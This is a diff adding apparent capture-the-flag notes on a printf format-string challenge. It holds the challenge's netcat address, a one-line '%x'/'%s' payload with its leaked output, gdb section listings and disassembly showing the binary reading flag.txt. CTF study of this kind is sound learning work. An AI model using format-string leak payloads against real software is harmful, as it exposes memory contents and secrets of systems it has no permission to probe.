@@ -1,0 +1,80 @@
+There's a super secret flag in printf that allows you to LEAK the data at an address??
+
+nc 2020.redpwnc.tf 31826
+
+
+---------
+
+
+this will open the flag.txt file and read the value into memory
+basically need to leak data using printf format string exploit 
+
+use %x or %p to get through memory
+use %s to print the flag eventually
+
+
+
+python -c 'print "%x "*6 + "%s"' | ./s 
+
+Hello there: ba72bdb0 0 0 d d 6854afc8
+
+----------
+
+know it reads from flag.txt
+make a local flag.txt and debug in gdb
+find where the offset is so can guess
+
+
+in gdb to see entry point
+'info files'
+
+Entry point: 0x555555554810
+0x0000555555554238 - 0x0000555555554254 is .interp
+0x0000555555554254 - 0x0000555555554274 is .note.ABI-tag
+0x0000555555554274 - 0x0000555555554298 is .note.gnu.build-id
+0x0000555555554298 - 0x00005555555542c8 is .gnu.hash
+0x00005555555542c8 - 0x0000555555554460 is .dynsym
+0x0000555555554460 - 0x0000555555554536 is .dynstr
+0x0000555555554536 - 0x0000555555554558 is .gnu.version
+0x0000555555554558 - 0x0000555555554588 is .gnu.version_r
+0x0000555555554588 - 0x0000555555554690 is .rela.dyn
+0x0000555555554690 - 0x0000555555554750 is .rela.plt
+0x0000555555554750 - 0x0000555555554767 is .init
+0x0000555555554770 - 0x0000555555554800 is .plt
+0x0000555555554800 - 0x0000555555554808 is .plt.got
+0x0000555555554810 - 0x0000555555554a92 is .text
+0x0000555555554a94 - 0x0000555555554a9d is .fini
+0x0000555555554aa0 - 0x0000555555554b1b is .rodata
+0x0000555555554b1c - 0x0000555555554b58 is .eh_frame_hdr
+0x0000555555554b58 - 0x0000555555554c60 is .eh_frame
+0x0000555555754d80 - 0x0000555555754d88 is .init_array
+0x0000555555754d88 - 0x0000555555754d90 is .fini_array
+0x0000555555754d90 - 0x0000555555754f80 is .dynamic
+0x0000555555754f80 - 0x0000555555755000 is .got
+0x0000555555755000 - 0x0000555555755010 is .data
+0x0000555555755020 - 0x0000555555755050 is .bss
+
+
+[0x0000091a]> pdf
+            ; DATA XREF from entry0 @ 0x82d
+┌ 258: int main (int argc, char **argv, char **envp);
+
+main:
+    0x91a
+    
+    ...
+    │           0x00000944      488d3d5d0100.  lea rdi, qword str.flag.txt ; 0xaa8 ; "flag.txt" ; const char *path
+    │           0x0000094b      b800000000     mov eax, 0
+    │           0x00000950      e89bfeffff     call sym.imp.open           ; int open(const char *path, int oflag)
+    │           0x00000955      8945d4         mov dword [var_2ch], eax
+    │           0x00000958      488b4dd8       mov rcx, qword [var_28h]
+    │           0x0000095c      8b45d4         mov eax, dword [var_2ch]
+    │           0x0000095f      ba00010000     mov edx, 0x100              ; size_t nbyte
+    │           0x00000964      4889ce         mov rsi, rcx                ; void *buf
+    │           0x00000967      89c7           mov edi, eax                ; int fildes
+    │           0x00000969      b800000000     mov eax, 0
+    │           0x0000096e      e84dfeffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
+    ...
+    
+reads 256 bytes
+
